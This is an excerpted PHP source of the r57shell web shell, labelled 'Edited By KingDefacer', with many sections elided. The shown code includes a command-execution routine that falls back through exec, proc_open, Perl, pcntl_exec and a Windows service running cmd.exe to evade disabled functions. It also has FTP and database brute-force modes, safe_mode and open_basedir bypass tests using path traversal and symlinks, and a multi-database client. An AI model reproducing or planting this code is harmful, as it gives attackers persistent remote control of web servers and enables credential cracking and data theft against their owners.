    ...
    function select_db() {
        switch ($this->db) {
            ...
            case 'MySQLi':
                ...
                break;
            case 'mSQL':
                if (@msql_select_db($this->base, $this->connection))
                    return 1;
                break;
            case 'SQLite':
                return 1;
...
function ex($cfe) {
    ...
    if (!empty($cfe)) {
        if (@function_exists('exec')) {
            ...
            @pclose($f);
        } elseif (@function_exists('proc_open') && @is_resource($f = @proc_open($cfe, array(
            1 => array(
                "pipe",
                "w"
            )
        ...
        if (extension_loaded('perl')) {
            ...
            if (!@function_exists('escapeshellarg')) {
                ...
                @win32_create_service(array(
                    ...
                    'display' => $n_ser,
                    'path' => 'c:\\windows\\system32\\cmd.exe',
                    'params' => "/c " . @escapeshellarg($cfe) . " >\"$output\""
                ));
            }
            ...
            if ($pid == -1) {
                ...
                if (@pcntl_exec('/usr/bin/perl', $cfe))
                    exit(0);
                if (@pcntl_exec('/usr/local/bin/perl', $cfe))
                    exit(0);
                die();
            }
            $res = moreread($output);
...
echo $head;
echo '</head>';
echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc width=100><font face=Verdana size=2>' . ws(2) . '<b>' . ws(2) . '<center>r57shell<br>v.' . $version . '</b><br><p><b><font color="#FF0000" size="2">Edited By KingDefacer</font></b></p></center></font>' . $fs . '<font face=Verdana size=-2><center>' . $lang[$language . '_text143'] . "<b>" . $tempdir . "</b><br>" . $select_tempdir . '<br>' . in('submit', 'submit', 0, $lang[$language . '_butt6']) . '</center></font>' . $fe . '</td>' . '<td bgcolor=#cccccc><font face=Verdana size=-2>';
...
if (!empty($_POST['cmd']) && (($_POST['cmd'] == "ftp_brute") || ($_POST['cmd'] == "db_brute"))) {
    ...
    if (!$connection) {
        ...
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>Can\'t get password list</b></div></font></td></tr></table>";
        $_POST['cmd'] = "";
    }
    if ($_POST['cmd'] == "ftp_brute") {
        @ftp_close($connection);
...
if ($safe_mode || $open_basedir) {
    switch ($_POST['cmd']) {
        ...
        case 'test15':
            ...
            break;
        case 'test16':
            if (@fopen('srpath://../../../../../../../../../../../' . $_POST['test16_file'], "a"))
                echo $lang[$language . '_text61'];
            break;
        case 'test17_1':
            @unlink('symlinkread');
...
function div($id) {
    ...
    if (empty($_COOKIE[$id]) && @in_array($id, $divid))
        return '<div id="' . $id . '" style="display: none;">';
    return '<div id="' . $id . '">';
}
if (!$safe_mode) {
...
if ($mysql_on || $mssql_on || $pg_on || $ora_on || $mysqli_on || $msql_on || $sqlite_on) {
    ...
    if ($mysql_on)
        $select .= '<option value=MySQL>MySQL</option>';
    if ($mssql_on)
        $select .= '<option value=MSSQL>MSSQL</option>';
    if ($pg_on)
        $select .= '<option value=PostgreSQL>PostgreSQL</option>';
    if ($ora_on)
        $select .= '<option value=Oracle>Oracle</option>';
    if ($mysqli_on)
        $select .= '<option value=MySQLi>MySQLi</option>';
    if ($msql_on)
        $select .= '<option value=mSQL>mSQL</option>';
    if ($sqlite_on)
        $select .= '<option value=SQLite>SQLite</option>';
    $select .= '</select>';
